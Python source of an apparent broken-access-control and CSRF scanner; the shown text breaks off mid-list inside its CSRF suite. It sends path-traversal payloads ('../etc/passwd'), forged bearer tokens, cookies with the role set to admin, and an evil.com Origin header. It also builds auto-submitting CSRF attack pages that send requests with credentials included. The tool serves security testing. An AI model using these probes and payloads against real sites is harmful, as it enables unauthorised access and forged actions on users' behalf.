#!/usr/bin/env python3
"""
unified_bac.py

Fixed and improved Combined multithreaded BAC + CSRF scanner.

Key fixes & features:
- Crawl strictly respects max_depth and same-origin; prevents exploding link counts.
- Resolves relative links against the *current* page (not base) when crawling.
- Keeps track of discovered link depth (so final link set honors max_depth).
- Selenium fallback restricted to URLs within depth and same origin (prevents large extractions).
- CSRF report linking fixed (uses basename since CSRF files live in same report dir).
- Adds TLS test as a proper concurrent test (uses tls_check).
- CVSS scores are attached to each finding; template updated to display it.
- Multithreading retained for crawl & tests.
"""

import os
import time
import json
import argparse
import ssl
import socket
from datetime import datetime
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse, parse_qsl
from concurrent.futures import ThreadPoolExecutor, as_completed, wait, FIRST_COMPLETED
from collections import deque
from dataclasses import dataclass, field
from typing import Dict, Optional

# Third-party libs
import requests
from bs4 import BeautifulSoup
from jinja2 import Template

# Optional libs
try:
    from playwright.sync_api import sync_playwright
    playwright_available = True
except Exception:
    playwright_available = False

try:
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    selenium_available = True
except Exception:
    selenium_available = False

# ---------- CONFIG ----------
MAX_WORKERS = 10
REQUEST_TIMEOUT = 10
CRAWL_USER_AGENT = "UnifiedBACScanner/1.0"
CSRF_ALLOW_CROSS_ORIGIN = True
STATIC_EXTENSIONS = (
    ".jpg", ".jpeg", ".png", ".gif", ".svg", ".webp",
    ".mp4", ".avi", ".mov", ".wmv", ".mkv",
    ".css", ".woff", ".woff2", ".ttf", ".eot", ".otf",
    ".ico", ".pdf", ".zip", ".rar", ".7z", ".tar", ".gz",
    ".mp3", ".ogg"
)
# Maximum number of links to discover overall to prevent runaway (still respects depth)
MAX_TOTAL_LINKS = 5000
# ----------------------------

# CVSS-like heuristic
def cvss_score_for_risk(risk_label):
    mapping = {"High": 9.0, "Medium": 6.0, "Low": 2.0, "Unknown": 4.0}
    return mapping.get(risk_label, 4.0)

# TLS check
def tls_check(hostname, port=443, timeout=5):
    res = {
        "hostname": hostname, "port": port, "ok": False, "protocol": None, "cipher": None,
        "cert_subject": None, "cert_issuer": None, "cert_notbefore": None, "cert_notafter": None,
        "cert_days_until_expiry": None, "error": None, "status": None
    }
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        with socket.create_connection((hostname, port), timeout=timeout) as sock:
            with ctx.wrap_socket(sock, server_hostname=hostname) as ssock:
                res["protocol"] = ssock.version()
                ciph = ssock.cipher()
                if ciph:
                    res["cipher"] = " ".join(map(str, ciph))
                cert = ssock.getpeercert()
                if cert:
                    subj = cert.get("subject", ())
                    subj_str = ", ".join("=".join(x) for tup in subj for x in tup) if subj else ""
                    issuer = cert.get("issuer", ())
                    issuer_str = ", ".join("=".join(x) for tup in issuer for x in tup) if issuer else ""
                    res["cert_subject"] = subj_str
                    res["cert_issuer"] = issuer_str
                    notbefore = cert.get("notBefore")
                    notafter = cert.get("notAfter")
                    if notbefore:
                        try:
                            nb = datetime.strptime(notbefore, "%b %d %H:%M:%S %Y %Z")
                            res["cert_notbefore"] = nb.isoformat()
                        except Exception:
                            res["cert_notbefore"] = notbefore
                    if notafter:
                        try:
                            na = datetime.strptime(notafter, "%b %d %H:%M:%S %Y %Z")
                            res["cert_notafter"] = na.isoformat()
                            res["cert_days_until_expiry"] = (na - datetime.utcnow()).days
                        except Exception:
                            res["cert_notafter"] = notafter
                res["ok"] = True
                res["status"] = "TLS OK"
    except Exception as e:
        res["error"] = str(e)
        res["status"] = "TLS check error"
    return res

# Simple login helper (best-effort)
def login(base_url, username, password, login_endpoint="/login"):
    session = requests.Session()
    session.headers.update({"User-Agent": CRAWL_USER_AGENT})
    if not username and not password:
        return session
    try:
        login_url = base_url.rstrip("/") + login_endpoint
        payload = {"username": username, "password": password}
        session.post(login_url, data=payload, timeout=REQUEST_TIMEOUT)
    except Exception:
        pass
    return session

# Normalization, static detection
def normalize_url(u):
    p = urlparse(u)
    p = p._replace(fragment="")
    # strip trailing slash for canonicalization (but keep root '/')
    out = urlunparse(p)
    if out.endswith("/") and urlparse(out).path != "/":
        out = out.rstrip("/")
    return out

def looks_static(href):
    if not href:
        return True
    lower = href.lower()
    for ext in STATIC_EXTENSIONS:
        if lower.endswith(ext):
            return True
    return False

# Multithreaded link fetch
def fetch_links_single(url, session):
    """
    Fetch page at `url` and return resolved, normalized, same-origin links
    relative to that page (not the base).
    """
    links = []
    headers = {"User-Agent": CRAWL_USER_AGENT}
    try:
        r = session.get(url, headers=headers, timeout=REQUEST_TIMEOUT)
        text = r.text or ""
        soup = BeautifulSoup(text, "lxml")
        # anchors, forms (action), scripts (src)
        for tag in soup.find_all(["a", "form", "script"]):
            href = tag.get("href") or tag.get("action") or tag.get("src")
            if not href:
                continue
            if href.startswith("javascript:") or href.startswith("mailto:") or href.strip() == "#":
                continue
            if looks_static(href):
                continue
            try:
                full = urljoin(url, href)
                full_norm = normalize_url(full)
                links.append(full_norm)
            except Exception:
                continue
    except Exception:
        pass
    return links

def _same_origin(a, b):
    pa = urlparse(a)
    pb = urlparse(b)
    return (pa.scheme, pa.hostname, pa.port) == (pb.scheme, pb.hostname, pb.port)

def _path_depth_relative(base, target):
    """
    Return an integer approximating the path depth of `target` relative to `base`.
    Base '/a/b' -> target '/a/b/c/d' => depth 2
    """
    pb = urlparse(base).path.rstrip("/")
    pt = urlparse(target).path.rstrip("/")
    if not pb:
        pb = ""
    if not pt:
        pt = ""
    if pt.startswith(pb):
        rel = pt[len(pb):].lstrip("/")
        if not rel:
            return 0
        return len([p for p in rel.split("/") if p])
    else:
        # completely different path, consider depth high
        return 999

def crawl_site_multithread(base_url, session, max_depth=3, max_workers=MAX_WORKERS):
    """
    Robust multithreaded BFS crawl:
      - base_url: starting page
      - session: requests.Session()
      - max_depth: how deep to follow links (0 => only base page)
      - max_workers: max concurrent fetches
    """
    base_norm = normalize_url(base_url)
    base_parsed = urlparse(base_norm)
    discovered_depth: Dict[str, int] = {base_norm: 0}
    visited = set()
    q = deque()
    q.append(base_norm)
    session.headers.update({"User-Agent": CRAWL_USER_AGENT})

    print(f"[+] Crawling {base_norm} (max_depth={max_depth}) with {max_workers} workers ...")
    with ThreadPoolExecutor(max_workers=max_workers) as ex:
        active = {}
        try:
            while q or active:
                # schedule new tasks up to pool capacity
                while q and len(active) < max_workers and len(discovered_depth) < MAX_TOTAL_LINKS:
                    url = q.popleft()
                    if url in visited:
                        continue
                    visited.add(url)
                    fut = ex.submit(fetch_links_single, url, session)
                    active[fut] = url

                if not active:
                    # no active tasks, continue scheduling
                    if q:
                        continue
                    else:
                        break

                # wait for at least one future to complete
                done, _ = wait(active.keys(), timeout=5, return_when=FIRST_COMPLETED)
                for fut in list(done):
                    src_url = active.pop(fut, None)
                    try:
                        links = fut.result(timeout=1) or []
                    except Exception:
                        links = []
                    src_depth = discovered_depth.get(src_url, 0)
                    for l in links:
                        # enforce same origin
                        if not _same_origin(base_norm, l):
                            continue
                        # compute depth relative to base
                        depth = _path_depth_relative(base_norm, l)
                        # treat depth above threshold as not to be included
                        if depth > max_depth:
                            continue
                        if l not in discovered_depth:
                            discovered_depth[l] = depth
                            # only enqueue if within depth limit
                            if depth < max_depth:
                                q.append(l)
        except KeyboardInterrupt:
            print("[!] Crawl interrupted by user.")
        except Exception as e:
            print("[!] Crawl error:", e)

    all_links = sorted(discovered_depth.keys())

    # Selenium fallback to handle heavy JS SPAs only if very few links found
    if len(all_links) < 15 and selenium_available:
        print("[!] Few links found with requests. Falling back to Selenium (headless) to discover SPA links up to max_depth ...")
        driver = None
        try:
            chrome_options = Options()
            try:
                chrome_options.add_argument("--headless=new")
            except Exception:
                chrome_options.add_argument("--headless")
            chrome_options.add_argument("--no-sandbox")
            chrome_options.add_argument("--disable-dev-shm-usage")
            chrome_options.add_argument("--ignore-certificate-errors")
            for p in ("/usr/bin/chromium-browser", "/usr/bin/chromium", "/usr/bin/google-chrome"):
                if os.path.exists(p):
                    chrome_options.binary_location = p
                    break
            driver = webdriver.Chrome(options=chrome_options)
            driver.set_page_load_timeout(30)
            driver.get(base_norm)
            try:
                WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.CSS_SELECTOR, "body")))
            except Exception:
                pass
            time.sleep(1)
            elems = driver.find_elements(By.XPATH, "//a[@href] | //form[@action] | //script[@src] | //*[@routerlink]")
            for e in elems:
                try:
                    href = (e.get_attribute("href") or e.get_attribute("action") or e.get_attribute("src") or e.get_attribute("routerlink"))
                    if href and not looks_static(href):
                        full = urljoin(base_norm, href)
                        full_norm = normalize_url(full)
                        if _same_origin(base_norm, full_norm):
                            depth = _path_depth_relative(base_norm, full_norm)
                            if depth <= max_depth and full_norm not in discovered_depth:
                                discovered_depth[full_norm] = depth
                except Exception:
                    continue
            # try clicking a few navs to expose dynamic routes
            navs = driver.find_elements(By.XPATH, "//a[@routerlink] | //a[contains(@href,'#')]")
            for nav in navs[:20]:
                try:
                    driver.execute_script("arguments[0].click();", nav)
                    time.sleep(0.5)
                    page_html = driver.page_source
                    soup = BeautifulSoup(page_html, "lxml")
                    for tag in soup.find_all("a", href=True):
                        href = tag["href"]
                        if href and not looks_static(href):
                            full = urljoin(base_norm, href)
                            full_norm = normalize_url(full)
                            if _same_origin(base_norm, full_norm):
                                depth = _path_depth_relative(base_norm, full_norm)
                                if depth <= max_depth and full_norm not in discovered_depth:
                                    discovered_depth[full_norm] = depth
                except Exception:
                    continue
        except Exception as e:
            print("[!] Selenium fallback error:", e)
        finally:
            try:
                if driver:
                    driver.quit()
            except Exception:
                pass

    final_links = sorted(list(discovered_depth.keys()))
    print(f"[+] Found {len(final_links)} links total (respecting max_depth).")
    return final_links

# -----------------------
# BAC tests & helpers
# -----------------------
def extract_forms(url, session):
    forms = []
    try:
        r = session.get(url, timeout=REQUEST_TIMEOUT)
        soup = BeautifulSoup(r.text or "", "lxml")
        for idx, form in enumerate(soup.find_all("form"), start=1):
            action = form.get("action") or url
            method = form.get("method", "get").lower()
            full_url = urljoin(url, action)
            params = {}
            for inp in form.find_all(["input", "select", "textarea"]):
                name = inp.get("name")
                if not name:
                    continue
                val = inp.get("value", "")
                typ = (inp.get("type") or "").lower()
                if not val:
                    if typ == "email":
                        val = "test@example.com"
                    elif typ == "number":
                        val = "1"
                    else:
                        val = ""
                params[name] = val
            forms.append({"url": full_url, "method": method, "params": params, "name": form.get("id") or form.get("name") or f"form_{idx}"})
    except Exception:
        pass
    return forms

def test_idor(url, session):
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    findings = []
    for param in params:
        try:
            original_val = params[param][0] if params[param] else ""
            if str(original_val).isdigit():
                new_val = str(int(original_val) + 1)
                q = {k: (v if isinstance(v, list) else [v]) for k, v in params.items()}
                q[param] = [new_val]
                tampered_query = urlencode(q, doseq=True)
                tampered_url = urlunparse(parsed._replace(query=tampered_query))
                res = session.get(tampered_url, timeout=REQUEST_TIMEOUT)
                body = res.text.lower() if res.text else ""
                if res.status_code == 200 and "unauthorized" not in body and "forbidden" not in body:
                    findings.append({
                        "url": tampered_url, "status": "Vulnerable", "risk": "High",
                        "details": f"Parameter {param} modified ({original_val} → {new_val})",
                        "mitigation": "Use UUIDs/indirect references; enforce server-side access checks.",
                        "cvss": cvss_score_for_risk("High")
                    })
                else:
                    findings.append({
                        "url": tampered_url, "status": "Not Vulnerable", "risk": "High",
                        "details": f"Access blocked for parameter {param}",
                        "mitigation": "Use UUIDs/indirect references; enforce server-side access checks.",
                        "cvss": cvss_score_for_risk("High")
                    })
        except Exception:
            continue
    return findings if findings else [{
        "status": "No IDOR parameters found", "risk": "Low", "details": "-", "mitigation": "Use UUIDs/indirect references.", "cvss": cvss_score_for_risk("Low")
    }]

def test_privilege(base_url, session, admin_creds):
    if not admin_creds:
        return [{"status": "Skipped", "risk": "High", "details": "No admin creds", "mitigation": "Enforce RBAC", "cvss": cvss_score_for_risk("High")}]
    return [{"status": "Simulated", "risk": "High", "details": "Privilege escalation placeholder", "mitigation": "Enforce RBAC", "cvss": cvss_score_for_risk("High")}]

def test_directory(base_url, session):
    payloads = ["../etc/passwd", "../../admin/config"]
    results = []
    for p in payloads:
        try:
            url = base_url.rstrip("/") + "/" + p
            res = session.get(url, timeout=REQUEST_TIMEOUT)
            body = (res.text or "").lower()
            if res.status_code == 200 and ("root:x:" in body or "bin/bash" in body or "administrator" in body):
                results.append({"url": url, "status": "Vulnerable", "risk": "High", "details": "Sensitive file content exposed", "mitigation": "Sanitize inputs", "cvss": cvss_score_for_risk("High")})
            elif res.status_code in [403, 401]:
                results.append({"url": url, "status": "Not Vulnerable", "risk": "High", "details": f"Access blocked (HTTP {res.status_code})", "mitigation": "Sanitize inputs", "cvss": cvss_score_for_risk("High")})
            else:
                results.append({"url": url, "status": "Not Vulnerable", "risk": "High", "details": f"No sensitive content (HTTP {res.status_code})", "mitigation": "Sanitize inputs", "cvss": cvss_score_for_risk("High")})
        except Exception:
            results.append({"url": base_url + "/" + p, "status": "Error", "risk": "High", "details": "Request failed", "mitigation": "Sanitize inputs", "cvss": cvss_score_for_risk("High")})
    return results

def test_method_bypass(url, session):
    results = []
    try:
        res = session.post(url, timeout=REQUEST_TIMEOUT)
        body = (res.text or "").lower()
        if res.status_code == 200 and not any(w in body for w in ["login", "signin", "error", "forbidden"]):
            results.append({"url": url, "method": "POST", "status": "Vulnerable", "risk": "Medium", "details": "Endpoint accepted POST", "mitigation": "Restrict methods", "cvss": cvss_score_for_risk("Medium")})
        elif res.status_code == 405:
            results.append({"url": url, "method": "POST", "status": "Not Vulnerable", "risk": "Medium", "details": "Method Not Allowed (405)", "mitigation": "Restrict methods", "cvss": cvss_score_for_risk("Medium")})
        else:
            results.append({"url": url, "method": "POST", "status": "Not Vulnerable", "risk": "Medium", "details": f"Rejected (HTTP {res.status_code})", "mitigation": "Restrict methods", "cvss": cvss_score_for_risk("Medium")})
    except Exception:
        results.append({"url": url, "method": "POST", "status": "Error", "risk": "Medium", "details": "Request failed", "mitigation": "Restrict methods", "cvss": cvss_score_for_risk("Medium")})
    return results

def test_force_browse(base_url, session):
    endpoints = ["/admin", "/config", "/debug", "/private"]
    results = []
    for ep in endpoints:
        try:
            url = base_url.rstrip("/") + ep
            res = session.get(url, timeout=REQUEST_TIMEOUT)
            body = (res.text or "").lower()
            if res.status_code == 200 and ("login" not in body and "signin" not in body):
                results.append({"url": url, "status": "Vulnerable", "risk": "Medium", "details": "Sensitive page accessible without login", "mitigation": "Enforce auth", "cvss": cvss_score_for_risk("Medium")})
            else:
                results.append({"url": url, "status": "Not Vulnerable", "risk": "Medium", "details": f"Blocked or redirected (HTTP {res.status_code})", "mitigation": "Enforce auth", "cvss": cvss_score_for_risk("Medium")})
        except Exception:
            results.append({"url": base_url + ep, "status": "Error", "risk": "Medium", "details": "Request failed", "mitigation": "Enforce auth", "cvss": cvss_score_for_risk("Medium")})
    return results

def test_header_token(base_url, session):
    results = []
    endpoints = ["/admin", "/config", "/private"]
    for ep in endpoints:
        url = base_url.rstrip("/") + ep
        try:
            headers = {k: v for k, v in session.headers.items() if k.lower() != "authorization"}
            res2 = session.get(url, headers=headers, timeout=REQUEST_TIMEOUT)
            fake_headers = headers.copy()
            fake_headers["Authorization"] = "Bearer FAKE123"
            res3 = session.get(url, headers=fake_headers, timeout=REQUEST_TIMEOUT)
            body2 = (res2.text or "").lower()
            body3 = (res3.text or "").lower()
            if (res2.status_code == 200 and "login" not in body2) or (res3.status_code == 200 and "login" not in body3):
                results.append({"url": url, "status": "Vulnerable", "risk": "High", "details": "Bypassed auth with missing/forged token", "mitigation": "Validate tokens server-side", "cvss": cvss_score_for_risk("High")})
            else:
                results.append({"url": url, "status": "Not Vulnerable", "risk": "High", "details": "Authorization enforced", "mitigation": "Validate tokens server-side", "cvss": cvss_score_for_risk("High")})
        except Exception:
            results.append({"url": url, "status": "Error", "risk": "High", "details": "Request failed", "mitigation": "Validate tokens", "cvss": cvss_score_for_risk("High")})
    return results

def test_cookie_manipulation(base_url, session):
    results = []
    endpoints = ["/admin", "/config"]
    for ep in endpoints:
        url = base_url.rstrip("/") + ep
        try:
            res2 = session.get(url, cookies={}, timeout=REQUEST_TIMEOUT)
            tampered = session.cookies.get_dict()
            for k in list(tampered.keys()):
                if "role" in k.lower():
                    tampered[k] = "admin"
            res3 = session.get(url, cookies=tampered, timeout=REQUEST_TIMEOUT)
            body2 = (res2.text or "").lower()
            body3 = (res3.text or "").lower()
            if (res2.status_code == 200 and "login" not in body2) or (res3.status_code == 200 and "login" not in body3):
                results.append({"url": url, "status": "Vulnerable", "risk": "High", "details": "Cookie manipulation bypassed access", "mitigation": "Do not store roles client-side", "cvss": cvss_score_for_risk("High")})
            else:
                results.append({"url": url, "status": "Not Vulnerable", "risk": "High", "details": "Cookies validated", "mitigation": "Do not store roles client-side", "cvss": cvss_score_for_risk("High")})
        except Exception:
            results.append({"url": url, "status": "Error", "risk": "High", "details": "Request failed", "mitigation": "Do not store roles client-side", "cvss": cvss_score_for_risk("High")})
    return results

def test_cors(base_url, session):
    results = []
    try:
        headers = {"Origin": "http://evil.com", "User-Agent": CRAWL_USER_AGENT}
        res = session.get(base_url, headers=headers, timeout=REQUEST_TIMEOUT)
        if "access-control-allow-origin" in res.headers and res.headers["access-control-allow-origin"] == "*":
            results.append({"url": base_url, "status": "Vulnerable", "risk": "Medium", "details": "CORS allows any origin (*)", "mitigation": "Restrict Access-Control-Allow-Origin", "cvss": cvss_score_for_risk("Medium")})
        else:
            results.append({"url": base_url, "status": "Not Vulnerable", "risk": "Medium", "details": "CORS restricted", "mitigation": "Restrict Access-Control-Allow-Origin", "cvss": cvss_score_for_risk("Medium")})
    except Exception:
        results.append({"url": base_url, "status": "Error", "risk": "Medium", "details": "CORS test failed", "mitigation": "Check CORS headers", "cvss": cvss_score_for_risk("Medium")})
    return results

# -----------------------
# Reports (BAC and CSRF) and templates
# -----------------------
TEST_GUIDE = {
    "IDOR": "Use UUIDs/indirect references; enforce access checks.",
    "Privilege Escalation": "Enforce server-side RBAC.",
    "Directory Traversal": "Sanitize inputs; deny '../'.",
    "Method Bypass": "Restrict allowed HTTP methods.",
    "Force Browsing": "Enforce authentication/authorization.",
    "Header/Token Tampering": "Validate tokens server-side.",
    "Cookie Manipulation": "Do not store roles client-side.",
    "CORS Misconfiguration": "Limit Access-Control-Allow-Origin.",
    "TLS": "Use modern TLS versions, strong ciphers; renew certificates."
}

MINIMAL_TEMPLATE = """<!doctype html><html><head><meta charset="utf-8"><title>BAC Report</title></head><body>
<h1>BAC Report - {{ data.site }}</h1>
<p>Generated: {{ data.timestamp }}</p>
<p>Crawled links: {{ data.crawled_links }}</p>
{% for test in data.tests %}
  <h3>{{ test.type }}</h3>
  {% if test.results %}
    <ul>
    {% for r in test.results %}<li>{{ r.get('url','-') }} — {{ r.get('status','') }} — {{ r.get('details','') }}</li>{% endfor %}
    </ul>
  {% else %}<p>No results</p>{% endif %}
{% endfor %}
{% if data.csrf_html %}<p><a href="{{ data.csrf_html }}">Open CSRF report</a></p>{% endif %}
</body></html>"""

def generate_reports(json_file, include_csrf_links=None):
    with open(json_file) as f:
        data = json.load(f)

    if "crawled_links" in data and data["crawled_links"] == 0:
        data["crawl_note"] = "WARNING: No links found during crawling. Site may require login or heavy JS."

    for test in data.get("tests", []):
        advice = TEST_GUIDE.get(test["type"], "General best practice")
        for r in test.get("results", []):
            r["mitigation"] = r.get("mitigation") or advice
            # ensure cvss present
            if "cvss" not in r:
                r["cvss"] = cvss_score_for_risk(r.get("risk", "Unknown"))

    summary = {
        "total_tests": len(data.get("tests", [])),
        "total_findings": sum(len(t.get("results", [])) for t in data.get("tests", [])),
        "vulnerable": sum(1 for t in data.get("tests", []) for r in t.get("results", []) if r.get("status") == "Vulnerable")
    }
    data["summary"] = summary

    parsed = urlparse(data["site"])
    host = parsed.hostname or parsed.path
    tls_info = tls_check(host) if parsed.scheme == "https" else {}
    data["tls_info"] = tls_info

    if include_csrf_links:
        # include_csrf_links expected as tuple of basenames so same-dir linking works
        data["csrf_html"], data["csrf_json"] = include_csrf_links

    template_path = "templates/report.html"
    if os.path.exists(template_path):
        tpl = open(template_path).read()
    else:
        tpl = MINIMAL_TEMPLATE

    out_html = Template(tpl).render(data=data)
    out_file = json_file.replace(".json", ".html")
    with open(out_file, "w") as f:
        f.write(out_html)

    exploited = {"site": data["site"], "timestamp": data["timestamp"], "tests": []}
    for test in data.get("tests", []):
        vulns = [r for r in test.get("results", []) if r.get("status") == "Vulnerable"]
        if vulns:
            exploited["tests"].append({"type": test["type"], "results": vulns})
    exploited_html = json_file.replace(".json", "_exploited.html")
    with open(exploited_html, "w") as f:
        f.write(Template(tpl).render(data=exploited))

    # audit log
    audit_entry = {
        "site": data["site"], "timestamp": data["timestamp"],
        "findings": summary["total_findings"], "vulnerabilities": summary["vulnerable"],
        "tls_ok": tls_info.get("ok", False), "tls_protocol": tls_info.get("protocol")
    }
    audit_log = "reports/audit_log.jsonl"
    os.makedirs(os.path.dirname(audit_log), exist_ok=True)
    with open(audit_log, "a") as f:
        f.write(json.dumps(audit_entry) + "\n")

    return out_file, exploited_html

# -----------------------
# CSRF suite
# -----------------------
@dataclass
class Action:
    name: str
    method: str
    url: str
    params: Dict[str, str] = field(default_factory=dict)
    body_format: str = "form"

def _parse_domain(url: str) -> str:
    return urlparse(url).hostname or "target"

def _build_query(url: str, params: dict) -> str:
    if not params:
        return url
    u = urlparse(url)
    q = dict(parse_qsl(u.query, keep_blank_values=True))
    q.update(params)
    return urlunparse((u.scheme, u.netloc, u.path, u.params, urlencode(q), u.fragment))

def _auth_header_pair(auth_header: Optional[str]):
    if not auth_header or ":" not in auth_header:
        return None
    k, v = auth_header.split(":", 1)
    return k.strip(), v.strip()

def html_img(url): return f'<img src="{url}"/>'
def html_script(url): return f'<script src="{url}"></script>'
def html_iframe(url): return f'<iframe src="{url}"></iframe>'
def html_meta_refresh(url): return f'<meta http-equiv="refresh" content="0; url={url}">'
def html_link(url, noreferrer=False):
    rel = ' rel="noreferrer"' if noreferrer else ""
    return f'<a id="go" href="{url}"{rel}>go</a><script>go.click()</script>'
def html_form_post(url, params):
    inputs = "".join([f'<input type="hidden" name="{k}" value="{v}">' for k, v in params.items()])
    return f'<form id="f" action="{url}" method="POST">{inputs}</form><script>f.submit()</script>'
def html_fetch_post(url, params, auth_header, body_format):
    import json as _json
    from urllib.parse import urlencode as _urlencode_local
    hk = _auth_header_pair(auth_header) if auth_header else None
    if body_format == "json":
        headers = '"Content-Type":"application/json"'
        body_js = _json.dumps(params or {})
    else:
        headers = '"Content-Type":"application/x-www-form-urlencoded"'
        body_js = '"'+_urlencode_local(params or {})+'"'
    extra = f',"{hk[0]}":"{hk[1]}"' if hk else ""
    return f'<script>fetch("{url}",{{method:"POST",credentials:"include",headers:{{{headers}{extra}}},body:{body_js}}})</script>'
def html_xhr(url, params, auth_header, body_format):
    import json as _json
    from urllib.parse import urlencode as _urlencode_local
    hk = _auth_header_pair(auth_header) if auth_header else None
    header_setter = f'x.setRequestHeader("{hk[0]}","{hk[1]}");' if hk else ''
    body = _json.dumps(params or {}) if body_format == "json" else _urlencode_local(params or {})
    return f'<script>var x=new XMLHttpRequest();x.open("POST","{url}",true);x.withCredentials=true;{header_setter}x.send({json.dumps(body)});</script>'
def html_multipart(url, params):
    inputs = "".join([f'<input type="hidden" name="{k}" value="{v}">' for k, v in params.items()])
    return f'<form id="mf" action="{url}" method="POST" enctype="multipart/form-data">{inputs}<input type="file" name="f"></form><script>mf.submit()</script>'
def html_duplicate_token(url, params):
    p = params.copy()
    if "token" in p:
        p["duplicate_token"] = p["token"]
    return html_form_post(url, p)
def html_samesite_refresh(url, params):
    from urllib.parse import urlencode as _urlencode_local
    return f'<script>document.cookie="refreshCSRF=1; SameSite=Lax";fetch("{url}",{{method:"POST",body:"{_urlencode_local(params)}"}})</script>'
def html_referer_bypass(url, params):
    ins = "".join([f"<input type=hidden name={k} value={v}>" for k, v in params.items()])
    return f'<iframe sandbox="allow-scripts allow-forms" srcdoc=\'<form action=\"{url}\" method=\"POST\">{ins}<input type=submit></form><script>document.forms[0].submit()</script>\'></iframe>'
def html_subdomain_bypass(url, params):
    from urllib.parse import urlencode as _urlencode_local
    return f'<script>fetch("{url}",{{method:"POST",mode:"cors",body:"{_urlencode_local(params)}"}})</script>'
def html_method_override(url, params):
    return html_link(_build_query(url, {**params, "_method": "POST"}))

def classify_exploit(csrf_applicable, jwt_based, vector_id, status):
    if jwt_based:
        return False, "Not applicable (JWT/header-based auth)"
    if not csrf_applicable:
        return False, "Not applicable (no session-bound action)"
    if not status or (isinstance(status, int) and status >= 400):
        return False, "HTTP error or failed to execute"
    if vector_id == "noreferrer_link":
        return True, "Accepted no Referer"
    if vector_id == "method_override":
        return True, "Accepted method override"
    return True, "Accepted (heuristic)"

_CSRF_TEMPLATE = """<!doctype html><html><meta charset="utf-8"><title>CSRF Report</title>
<style>body{font-family:Arial;margin:20px}th,td{border:1px solid #ddd;padding:6px}table{border-collapse:collapse;width:100%}</style>
<h1>CSRF Attack Suite Report</h1>
<p>Generated {{ts}} | Base: {{base}} | Actions: {{actions}} | Vectors: {{total}}</p>
{% if exploited %}<h3>✅ Exploited Vectors</h3><ul>{% for e in exploited %}<li>{{e.action}} → {{e.vector}} ({{e.status}}) → {{e.note}}<br><b>Mitigation:</b> {{e.mitigation}}</li>{% endfor %}</ul>{% else %}<p>ℹ️ None exploited</p>{% endif %}
<h2>Detailed Results</h2>
<table><tr><th>Action</th><th>Vector</th><th>Status</th><th>Exploited</th><th>Note</th><th>Mitigation</th></tr>
{% for r in results %}<tr><td>{{r.action}}<br><small>{{r.url}}</small></td><td>{{r.vector}}</td><td>{{r.status}}</td><td>{{"✅" if r.exploited else "❌" if "Not applicable" not in r.note else "N/A"}}</td><td>{{r.note}}</td><td>{{r.mitigation}}</td></tr>{% endfor %}</table></html>"""

def write_csrf_reports(base, results, exploited, out_dir, domain):
    os.makedirs(out_dir, exist_ok=True)
    ts = time.strftime("%Y-%m-%d_%H-%M-%S")
    prefix = os.path.join(out_dir, f"{domain}_csrf_{ts}")
    with open(prefix + ".json", "w") as f:
        json.dump(results, f, indent=2)
    with open(prefix + "_exploited.json", "w") as f:
        json.dump([r for r in results if r.get("exploited")], f, indent=2)
    html = Template(_CSRF_TEMPLATE).render(ts=time.ctime(), base=base, actions=len({r["action"] for r in results}), total=len(results), results=results, exploited=exploited)
    with open(prefix + ".html", "w") as f:
        f.write(html)
    exp_html = Template(_CSRF_TEMPLATE).render(ts=time.ctime(), base=base, actions=len({r["action"] for r in results}), total=len(results), results=[r for r in results if r.get("exploited")], exploited=exploited)
    with open(prefix + "_exploited.html", "w") as f:
        f.write(exp_html)
    with open(prefix + "_curl.txt", "w") as f:
        for r in results:
            f.write(r.get("curl", "") + "\n")
    return prefix + ".html", prefix + ".json", prefix + "_exploited.html", prefix + "_exploited.json", prefix + "_curl.txt"

def run_suite(cfg, out_dir, max_actions=None, per_action_timeout=10, headless=True):
    base = cfg["base_url"].rstrip("/")
    actions = [Action(**a) for a in cfg["actions"]]
    opt = cfg.get("optional", {})
    session_cookie = cfg.get("session_cookie")
    jwt_based = opt.get("jwt", False)
    csrf_applicable = bool(session_cookie and session_cookie.get("value"))
    if not playwright_available:
        print("[!] Playwright not available — skipping CSRF suite.")
        return None
    if max_actions is not None and max_actions > 0:
        actions = actions[:max_actions]

    results = []
    exploited = []
    domain = _parse_domain(base)
    print(f"[+] Starting CSRF suite: actions={len(actions)}, jwt_based={jwt_based}, csrf_applicable={csrf_applicable}")

    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=headless)
            ctx = browser.new_context(ignore_https_errors=True)
            ctx.set_default_navigation_timeout(int(per_action_timeout * 1000))
            ctx.set_default_timeout(int(per_action_timeout * 1000))
            if session_cookie and session_cookie.get("name") and session_cookie.get("value"):
                try:
                    ctx.add_cookies([{
                        "name": session_cookie["name"],
                        "value": session_cookie["value"],
                        "domain": session_cookie.get("domain", urlparse(base).hostname),
                        "path": session_cookie.get("path", "/")
                    }])
                except Exception:
                    pass
            page = ctx.new_page()

            for idx, act in enumerate(actions, 1):
                print(f"[CSRF] Action {idx}/{len(actions)}: {act.name} -> {act.url} (params: {len(act.params)})")
                # Skip cross-origin targets unless allowed
                if not CSRF_ALLOW_CROSS_ORIGIN:
                    target_host = urlparse(act.url).hostname
                    base_host = urlparse(base).hostname
                    if target_host and base_host and target_host != base_host:
                        note = "Skipped (external origin) to avoid Playwright navigation issues"
                        row = {"action": act.name, "url": act.url, "vector": "skip_external", "req_method": None,
                               "status": None, "exploited": False, "note": note, "mitigation": "If you want to test cross-origin, enable CSRF_ALLOW_CROSS_ORIGIN in script", "curl": ""}
                        results.append(row)
                        continue

                vecs = [
                    ("img_get", html_img(_build_query(act.url, act.params)), "GET"),
                    ("script_get", html_script(_build_query(act.url, act.params)), "GET"),
                    ("iframe_get", html_iframe(_build_query(act.url, act.params)), "GET"),
                    ("meta_refresh", html_meta_refresh(_build_query(act.url, act.params)), "GET"),
                    ("link_click", html_link(_build_query(act.url, act.params)), "GET"),
                    ("noreferrer_link", html_link(_build_query(act.url, act.params), True), "GET"),
                    ("form_post", html_form_post(act.url, act.params), "POST"),
                    ("fetch_post", html_fetch_post(act.url, act.params, opt.get("auth_header"), act.body_format), "POST"),
                    ("xhr_post", html_xhr(act.url, act.params, opt.get("auth_header"), act.body_format), "POST"),
                    ("multipart_post", html_multipart(act.url, act.params), "POST"),
